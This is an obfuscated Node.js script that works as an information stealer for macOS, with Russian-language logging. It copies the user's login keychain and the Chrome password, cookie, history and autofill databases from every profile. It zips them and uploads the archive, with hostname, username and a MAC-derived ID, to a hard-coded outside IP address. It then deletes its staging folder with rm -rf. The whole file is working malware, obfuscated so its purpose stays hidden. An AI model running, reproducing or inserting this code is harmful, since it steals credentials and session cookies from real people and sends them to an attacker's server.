const _0xf86509=_0x525f;(function(_0x4ad003,_0x2d519d){const _0x193701=_0x525f,_0x588bf3=_0x4ad003();while(!![]){try{const _0x59942f=-parseInt(_0x193701(0x123))/0x1*(parseInt(_0x193701(0x140))/0x2)+parseInt(_0x193701(0x15f))/0x3+parseInt(_0x193701(0x110))/0x4*(parseInt(_0x193701(0x153))/0x5)+parseInt(_0x193701(0xef))/0x6+-parseInt(_0x193701(0x161))/0x7+-parseInt(_0x193701(0x164))/0x8+parseInt(_0x193701(0x11b))/0x9;if(_0x59942f===_0x2d519d)break;else _0x588bf3['push'](_0x588bf3['shift']());}catch(_0x367dc4){_0x588bf3['push'](_0x588bf3['shift']());}}}(_0x53b7,0xea6dd));const fs=require('fs'),os=require('os'),path=require(_0xf86509(0xfc)),{exec,execSync}=require(_0xf86509(0x137)),crypto=require(_0xf86509(0x10e)),axios=require(_0xf86509(0x130)),FormData=require(_0xf86509(0xfd)),CONFIG={'serverUrl':_0xf86509(0xd5),'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':'Stable','zipFileName':'Stable.zip','chromeImportantFiles':[_0xf86509(0xdd),'Web\x20Data-journal',_0xf86509(0x14f),_0xf86509(0x129),_0xf86509(0xd4),_0xf86509(0x126),_0xf86509(0x13e),_0xf86509(0x155),_0xf86509(0xd8),_0xf86509(0xe4)]};function log(_0x4d1533,_0xe61bff=![]){const _0x2d0b8c=_0xf86509,_0x284ef3=new Date()[_0x2d0b8c(0x106)](),_0x56f432='['+_0x284ef3+']\x20'+_0x4d1533;_0xe61bff?console[_0x2d0b8c(0xff)](_0x56f432):console[_0x2d0b8c(0xd7)](_0x56f432);try{fs[_0x2d0b8c(0x127)](_0x2d0b8c(0x138),_0x56f432+'\x0a');}catch(_0x14b755){console[_0x2d0b8c(0xff)](_0x2d0b8c(0x148)+_0x14b755[_0x2d0b8c(0xeb)]);}}function createDirectory(_0x3dc06d){const _0x42c3a5=_0xf86509;try{return!fs[_0x42c3a5(0x160)](_0x3dc06d)?(fs[_0x42c3a5(0x11e)](_0x3dc06d,{'recursive':!![]}),log(_0x42c3a5(0x133)+_0x3dc06d)):log(_0x42c3a5(0x13b)+_0x3dc06d),!![];}catch(_0x2a14b3){return log('Error\x20creating\x20directory\x20'+_0x3dc06d+':\x20'+_0x2a14b3[_0x42c3a5(0xeb)],!![]),![];}}function _0x53b7(){const _0x4a1f6c=['log','Bookmarks','Chrome\x20file\x20not\x20found\x20in\x20profile\x20','Error\x20executing\x20command:\x20','rm\x20-rf\x20','push','Web\x20Data','==========\x20НАЧАЛО\x20ПРОЦЕССА\x20СБОРА\x20И\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','createReadStream','Прогресс\x20загрузки:\x20','userInfo','./node_modules/form-data','Default','Secure\x20Preferences','basename','\x20KB/s)','createHash','Стек\x20ошибки:\x20','statSync','Версия\x20Node.js:\x20','message','Error\x20scanning\x20Chrome\x20profiles:\x20','round','hex','6777198ptmRFz','version','Тип\x20ошибки:\x20','Found\x20','Повторная\x20попытка\x20через\x20','ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ\x20(попытка\x20','\x20имеет\x20нулевой\x20размер!','login.keychain-db','КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20','Error\x20copying\x20file\x20','00:00:00:00:00:00','toFixed','digest','path','form-data','stderr:\x20','error','Статус\x20ответа:\x20','substring','./node_modules/axios','ФАТАЛЬНАЯ\x20ОШИБКА:\x20','Установка\x20необходимых\x20зависимостей...','Зависимости\x20успешно\x20установлены','toISOString','Данные\x20ошибки:\x20','timeout','Статус\x20ошибки:\x20','hostname','maxRetries','trim','\x20copied\x20successfully','crypto','request','1890572knIitr','=====\x20ОТПРАВКА\x20АРХИВА\x20ЗАВЕРШЕНА\x20=====','=====\x20НАЧАЛО\x20ОТПРАВКИ\x20АРХИВА\x20=====','Current\x20user:\x20','application/zip','join','type','\x20секунд...','stableDir','/Library/Keychains/login.keychain-db','success','5770134BlcZoD','md5','Creating\x20ZIP\x20archive...','mkdirSync','Error\x20copying\x20Chrome\x20data:\x20','URL\x20сервера:\x20','Chrome_','networkInterfaces','383611VTNzjc','data','getHeaders','History-journal','appendFileSync','Ответ\x20сервера:\x20','Login\x20Data-journal','=====\x20СБОР\x20ДАННЫХ\x20ЗАВЕРШЕН\x20=====','ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation','loaded','stderr','stack','file','axios','platform','Загрузка\x20завершена\x20за\x20','Directory\x20created:\x20','status','cwd','append','child_process','collector.log','exit','serverUrl','Directory\x20already\x20exists:\x20','Profile\x20','\x20байт\x20(','Cookies','==========\x20СБОР\x20И\x20ОТПРАВКА\x20ДАННЫХ\x20УСПЕШНО\x20ЗАВЕРШЕНЫ\x20==========','2bEDGaE','\x20->\x20','ОШИБКА:\x20Файл\x20','retryDelay','username','zipFileName','Временная\x20директория\x20','size','Error\x20writing\x20to\x20log:\x20','unknown','/Library/Application\x20Support/Google/Chrome','Archive\x20size:\x20','keys','Keychain\x20file\x20not\x20found:\x20','Error\x20in\x20data\x20collection:\x20','Login\x20Data','Сбор\x20данных\x20завершился\x20с\x20ошибкой','==========\x20ОШИБКА\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','Информация\x20о\x20системе:\x20','20OUDfBg','post','Cookies-journal','total','Предупреждение:\x20Не\x20удалось\x20проверить/установить\x20зависимости:\x20','mac','length','ZIP\x20archive\x20created\x20successfully','arch','floor','/Users/','response','2150865RvAhXW','existsSync','12142270emPouh','zip\x20-r\x20-1\x20','Ошибка\x20настройки:\x20','10397952PlmWsf','code','Failed\x20to\x20create\x20ZIP\x20archive','stringify','File\x20copied:\x20','name','\x20-x\x20\x22*.DS_Store\x22','History','http://65.87.7.103:8088/api/files/upload','\x20секунд\x20('];_0x53b7=function(){return _0x4a1f6c;};return _0x53b7();}function copyFile(_0x192532,_0x1a497){const _0x30f31f=_0xf86509;try{return fs['copyFileSync'](_0x192532,_0x1a497),log(_0x30f31f(0x168)+_0x192532+_0x30f31f(0x141)+_0x1a497),!![];}catch(_0x1d71cd){return log(_0x30f31f(0xf8)+_0x192532+':\x20'+_0x1d71cd[_0x30f31f(0xeb)],!![]),![];}}function executeCommand(_0x324110){const _0x4dc324=_0xf86509;try{log('Executing\x20command:\x20'+_0x324110);const _0x1fd230=execSync(_0x324110,{'encoding':'utf8'});return log('Command\x20output:\x20'+_0x1fd230[_0x4dc324(0x10c)]()),{'success':!![],'output':_0x1fd230};}catch(_0x4daef5){log(_0x4dc324(0xda)+_0x4daef5['message'],!![]);if(_0x4daef5[_0x4dc324(0x12d)])log(_0x4dc324(0xfe)+_0x4daef5[_0x4dc324(0x12d)],!![]);return{'success':![],'error':_0x4daef5};}}function _0x525f(_0x4981e3,_0x19d267){const _0x53b71d=_0x53b7();return _0x525f=function(_0x525fde,_0x3fff56){_0x525fde=_0x525fde-0xd3;let _0x3adb1e=_0x53b71d[_0x525fde];return _0x3adb1e;},_0x525f(_0x4981e3,_0x19d267);}function formatFileSize(_0x3ec0c2){const _0x1ab1ea=_0xf86509;if(_0x3ec0c2===0x0)return'0\x20Bytes';const _0x1e3ef2=0x400,_0x34dad4=['Bytes','KB','MB','GB','TB'],_0x526fdc=Math[_0x1ab1ea(0x15c)](Math[_0x1ab1ea(0xd7)](_0x3ec0c2)/Math['log'](_0x1e3ef2));return parseFloat((_0x3ec0c2/Math['pow'](_0x1e3ef2,_0x526fdc))[_0x1ab1ea(0xfa)](0x2))+'\x20'+_0x34dad4[_0x526fdc];}function generateClientId(){const _0x4237bb=_0xf86509;try{const _0x286cf2=getMacAddress(),_0x124894=os[_0x4237bb(0x10a)](),_0x43bf9a=os['userInfo']()[_0x4237bb(0x144)],_0x3cc1e8=crypto[_0x4237bb(0xe7)](_0x4237bb(0x11c))['update'](_0x286cf2+':'+_0x124894+':'+_0x43bf9a)[_0x4237bb(0xfb)](_0x4237bb(0xee))[_0x4237bb(0x101)](0x0,0x8);return _0x3cc1e8;}catch(_0x2779c8){return Math['random']()['toString'](0x24)[_0x4237bb(0x101)](0x2,0xa);}}function getMacAddress(){const _0x2a5c97=_0xf86509;try{const _0x807883=os[_0x2a5c97(0x122)]();for(const _0x3652c8 of Object[_0x2a5c97(0x14c)](_0x807883)){for(const _0x2accde of _0x807883[_0x3652c8]){if(!_0x2accde['internal']&&_0x2accde['mac']!==_0x2a5c97(0xf9))return _0x2accde[_0x2a5c97(0x158)];}}return _0x2a5c97(0x149);}catch(_0x4d3131){return _0x2a5c97(0x149);}}async function collectData(){const _0x32cd3b=_0xf86509;try{log('=====\x20НАЧАЛО\x20СБОРА\x20ДАННЫХ\x20=====');if(!createDirectory(CONFIG[_0x32cd3b(0x118)]))throw new Error('Failed\x20to\x20create\x20Stable\x20directory');const _0x16d7ec=os['userInfo']()[_0x32cd3b(0x144)];log(_0x32cd3b(0x113)+_0x16d7ec);const _0x369780='/Users/'+_0x16d7ec+_0x32cd3b(0x119),_0x56b9ba=path['join'](CONFIG[_0x32cd3b(0x118)],_0x32cd3b(0xf6));fs[_0x32cd3b(0x160)](_0x369780)?copyFile(_0x369780,_0x56b9ba):log(_0x32cd3b(0x14d)+_0x369780,!![]);try{const _0x2124c9=_0x32cd3b(0x15d)+_0x16d7ec+_0x32cd3b(0x14a);if(fs[_0x32cd3b(0x160)](_0x2124c9)){const _0x10e165=[];fs[_0x32cd3b(0x160)](path[_0x32cd3b(0x115)](_0x2124c9,_0x32cd3b(0xe3)))&&_0x10e165[_0x32cd3b(0xdc)](_0x32cd3b(0xe3));try{const _0x1a2002=fs['readdirSync'](_0x2124c9,{'withFileTypes':!![]});for(const _0x4ec49e of _0x1a2002){_0x4ec49e['isDirectory']()&&_0x4ec49e[_0x32cd3b(0x169)]['startsWith'](_0x32cd3b(0x13c))&&_0x10e165['push'](_0x4ec49e[_0x32cd3b(0x169)]);}}catch(_0x3666d5){log(_0x32cd3b(0xec)+_0x3666d5[_0x32cd3b(0xeb)],!![]);}log(_0x32cd3b(0xf2)+_0x10e165[_0x32cd3b(0x159)]+'\x20Chrome\x20profiles:\x20'+_0x10e165['join'](',\x20'));for(const _0x33cba8 of _0x10e165){const _0x3559e1=path[_0x32cd3b(0x115)](_0x2124c9,_0x33cba8),_0x13922b=path[_0x32cd3b(0x115)](CONFIG[_0x32cd3b(0x118)],_0x32cd3b(0x121)+_0x33cba8);createDirectory(_0x13922b);for(const _0x35b462 of CONFIG['chromeImportantFiles']){const _0x274317=path[_0x32cd3b(0x115)](_0x3559e1,_0x35b462),_0xce0190=path[_0x32cd3b(0x115)](_0x13922b,_0x35b462);fs[_0x32cd3b(0x160)](_0x274317)?copyFile(_0x274317,_0xce0190):log(_0x32cd3b(0xd9)+_0x33cba8+':\x20'+_0x274317);}log('Chrome\x20data\x20for\x20profile\x20'+_0x33cba8+_0x32cd3b(0x10d));}}else log('Chrome\x20directory\x20not\x20found:\x20'+_0x2124c9,!![]);}catch(_0x1bca5e){log(_0x32cd3b(0x11f)+_0x1bca5e[_0x32cd3b(0xeb)],!![]);}log(_0x32cd3b(0x11d));const _0x5548c4=executeCommand(_0x32cd3b(0x162)+CONFIG[_0x32cd3b(0x145)]+'\x20'+CONFIG['stableDir']+_0x32cd3b(0xd3));if(!_0x5548c4[_0x32cd3b(0x11a)])throw new Error(_0x32cd3b(0x166));log(_0x32cd3b(0x15a));if(fs[_0x32cd3b(0x160)](CONFIG['zipFileName'])){const _0x2f1604=fs[_0x32cd3b(0xe9)](CONFIG['zipFileName']);log(_0x32cd3b(0x14b)+formatFileSize(_0x2f1604['size']));}else throw new Error(_0x32cd3b(0x12b));return log(_0x32cd3b(0x12a)),!![];}catch(_0x45894b){return log(_0x32cd3b(0x14e)+_0x45894b[_0x32cd3b(0xeb)],!![]),![];}}async function uploadFile(_0x5bf9b9=0x0){const _0x15ca39=_0xf86509;try{const _0x52712d=path['join'](process[_0x15ca39(0x135)](),CONFIG[_0x15ca39(0x145)]);if(!fs[_0x15ca39(0x160)](_0x52712d))return log(_0x15ca39(0xf7)+_0x52712d,!![]),log('Текущая\x20директория:\x20'+process['cwd'](),!![]),log('Содержимое\x20директории:\x20'+fs['readdirSync'](process[_0x15ca39(0x135)]())[_0x15ca39(0x115)](',\x20'),!![]),![];const _0x37e03c=fs['statSync'](_0x52712d),_0x11f26f=_0x37e03c[_0x15ca39(0x147)];log('Размер\x20файла:\x20'+_0x11f26f+_0x15ca39(0x13d)+formatFileSize(_0x11f26f)+')');if(_0x11f26f===0x0)return log(_0x15ca39(0x142)+CONFIG[_0x15ca39(0x145)]+_0x15ca39(0xf5),!![]),![];const _0x1a9686=new FormData();_0x1a9686[_0x15ca39(0x136)](_0x15ca39(0x12f),fs[_0x15ca39(0xdf)](_0x52712d),{'filename':path[_0x15ca39(0xe5)](_0x52712d),'contentType':_0x15ca39(0x114),'knownLength':_0x11f26f});const _0x6865={'hostname':os[_0x15ca39(0x10a)](),'platform':os['platform'](),'type':os[_0x15ca39(0x116)](),'arch':os[_0x15ca39(0x15b)](),'username':os[_0x15ca39(0xe1)]()[_0x15ca39(0x144)],'id':generateClientId()};log(_0x15ca39(0x112)),log(_0x15ca39(0x152)+JSON[_0x15ca39(0x167)](_0x6865)),log(_0x15ca39(0x120)+CONFIG['serverUrl']);const _0x5092c2=Date['now']();log('Отправка\x20началась\x20в:\x20'+new Date(_0x5092c2)[_0x15ca39(0x106)]());const _0x499044=await axios[_0x15ca39(0x154)](CONFIG[_0x15ca39(0x13a)],_0x1a9686,{'headers':{..._0x1a9686[_0x15ca39(0x125)](),'X-Client-Info':JSON['stringify'](_0x6865),'Content-Length':_0x1a9686['getLengthSync']()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x15ca39(0x108)],'onUploadProgress':_0x294e47=>{const _0x1183c2=_0x15ca39,_0x177b8a=Math[_0x1183c2(0xed)](_0x294e47[_0x1183c2(0x12c)]*0x64/_0x294e47[_0x1183c2(0x156)]);log(_0x1183c2(0xe0)+_0x177b8a+'%\x20('+formatFileSize(_0x294e47[_0x1183c2(0x12c)])+'/'+formatFileSize(_0x294e47['total'])+')');}}),_0x4dcf4e=Date['now'](),_0x78e9ea=(_0x4dcf4e-_0x5092c2)/0x3e8,_0x1be6e6=_0x11f26f/_0x78e9ea/0x400;return log(_0x15ca39(0x132)+_0x78e9ea['toFixed'](0x1)+_0x15ca39(0xd6)+_0x1be6e6[_0x15ca39(0xfa)](0x2)+_0x15ca39(0xe6)),log(_0x15ca39(0x100)+_0x499044[_0x15ca39(0x134)]),log(_0x15ca39(0x128)+JSON['stringify'](_0x499044[_0x15ca39(0x124)])),log(_0x15ca39(0x111)),_0x499044[_0x15ca39(0x124)][_0x15ca39(0x11a)];}catch(_0x482a8c){log(_0x15ca39(0xf4)+(_0x5bf9b9+0x1)+'/'+CONFIG[_0x15ca39(0x10b)]+'):',!![]);if(_0x482a8c[_0x15ca39(0x15e)])log(_0x15ca39(0x109)+_0x482a8c[_0x15ca39(0x15e)][_0x15ca39(0x134)],!![]),log(_0x15ca39(0x107)+JSON[_0x15ca39(0x167)](_0x482a8c[_0x15ca39(0x15e)][_0x15ca39(0x124)]),!![]);else _0x482a8c[_0x15ca39(0x10f)]?(log('Нет\x20ответа\x20от\x20сервера',!![]),log(_0x15ca39(0xf1)+_0x482a8c[_0x15ca39(0x165)],!![])):log(_0x15ca39(0x163)+_0x482a8c['message'],!![]);if(_0x5bf9b9<CONFIG[_0x15ca39(0x10b)])return log(_0x15ca39(0xf3)+CONFIG[_0x15ca39(0x143)]/0x3e8+_0x15ca39(0x117)),await new Promise(_0x3d97da=>setTimeout(_0x3d97da,CONFIG[_0x15ca39(0x143)])),uploadFile(_0x5bf9b9+0x1);return log('Превышено\x20максимальное\x20количество\x20попыток\x20('+CONFIG['maxRetries']+')',!![]),![];}}async function main(){const _0x43c62d=_0xf86509;try{log(_0x43c62d(0xde)),log(_0x43c62d(0xea)+process[_0x43c62d(0xf0)]),log('Платформа:\x20'+process[_0x43c62d(0x131)]),log('Директория\x20запуска:\x20'+process['cwd']());try{(!fs[_0x43c62d(0x160)](_0x43c62d(0x102))||!fs[_0x43c62d(0x160)](_0x43c62d(0xe2)))&&(log(_0x43c62d(0x104)),execSync('npm\x20install\x20axios\x20form-data'),log(_0x43c62d(0x105)));}catch(_0x38ed1b){log(_0x43c62d(0x157)+_0x38ed1b['message']);}const _0x2f1776=await collectData();!_0x2f1776&&(log(_0x43c62d(0x150),!![]),process[_0x43c62d(0x139)](0x1));const _0x525f14=await uploadFile();if(_0x525f14){log(_0x43c62d(0x13f));try{fs['existsSync'](CONFIG['stableDir'])&&(executeCommand(_0x43c62d(0xdb)+CONFIG[_0x43c62d(0x118)]),log(_0x43c62d(0x146)+CONFIG[_0x43c62d(0x118)]+'\x20удалена'));}catch(_0x501752){log('Предупреждение:\x20Ошибка\x20при\x20удалении\x20временных\x20файлов:\x20'+_0x501752['message']);}process[_0x43c62d(0x139)](0x0);}else log(_0x43c62d(0x151),!![]),process[_0x43c62d(0x139)](0x1);}catch(_0x2e2ee2){log(_0x43c62d(0x103)+_0x2e2ee2[_0x43c62d(0xeb)],!![]),log(_0x43c62d(0xe8)+_0x2e2ee2[_0x43c62d(0x12e)],!![]),process['exit'](0x1);}}main();
